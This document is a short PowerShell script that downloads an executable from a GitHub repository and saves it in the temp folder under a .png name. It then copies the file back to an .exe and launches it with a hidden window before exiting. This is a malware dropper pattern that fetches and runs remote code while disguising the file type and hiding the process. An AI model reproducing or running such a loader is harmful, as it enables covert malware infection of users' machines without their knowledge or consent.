Invoke-WebRequest -Uri "https://github.com/jokerxgutea/testhtb/raw/refs/heads/main/hh3tgn.golden.exe" -OutFile "$env:TEMP\hh3tgn.goldens.png" -UseBasicParsing | Out-Null


Copy-Item "$env:TEMP\hh3tgn.goldens.png" "$env:TEMP\hh3tgn.goldens.exe" -Force
Start-Process "$env:TEMP\hh3tgn.goldens.exe" -WindowStyle Hidden
exit
